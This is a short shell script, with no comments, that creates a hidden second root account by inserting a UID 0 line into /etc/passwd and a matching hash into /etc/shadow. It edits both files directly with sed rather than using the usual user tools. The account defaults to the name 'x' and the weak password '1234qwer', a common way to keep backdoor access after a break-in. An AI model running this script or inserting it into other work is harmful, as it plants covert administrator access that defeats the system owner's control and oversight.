#!/bin/sh

read -p 'Username [Default = x]: ' USERNAME

if [ ! -n "$USERNAME" ]; then
	USERNAME="x";
fi

if [ `grep -c "^$USERNAME:" /etc/passwd` -ge 1 ]; then
	echo [!] User is already exists 
	exit
fi

sed "2i$USERNAME:x:0:0::/:" /etc/passwd > .passwd

read -s -p 'Password [Default = 1234qwer]: ' PASSWORD

if [ ! -n "$PASSWORD" ]; then
	PASSWORD="1234qwer";
fi

echo $'\n[+] Encrypting Password...'
GENERATED_PASSWORD=`openssl passwd -6 -salt $(openssl rand -base64 16) $PASSWORD`

sudo sed "2i$USERNAME:$GENERATED_PASSWORD:::::::" /etc/shadow > .shadow

sudo chmod 644 .passwd
sudo chmod 600 .shadow
sudo chown root:root .passwd .shadow

sudo mv .passwd /etc/passwd
sudo mv .shadow /etc/shadow

echo [+] User $USERNAME has been created
